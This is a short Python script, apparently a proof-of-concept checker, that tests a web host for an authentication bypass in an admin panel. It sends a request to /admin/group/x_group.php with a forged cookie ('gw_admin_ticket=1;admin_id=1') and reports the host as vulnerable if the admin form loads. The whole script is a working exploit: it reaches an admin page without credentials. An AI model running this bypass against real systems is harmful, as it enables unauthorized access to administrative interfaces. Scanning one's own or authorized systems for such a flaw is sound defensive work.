import requests
import re

# 设置主机名，可以在命令行参数中传入该值
hostname = "example.com"

# 构造请求数据并发送请求
headers = {
    "Host": hostname,
    "Cookie": "gw_admin_ticket=1;admin_id=1",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"macOS\"",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Jaky; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    "Connection": "close"
}
url = f"http://{hostname}/admin/group/x_group.php?id=1"
response = requests.get(url, headers=headers)

# 判断响应是否符合预期
if response.status_code == 200 and re.search(r"form1", response.text):
    print("Vulnerability found!")
else:
    print("Vulnerability not found.")
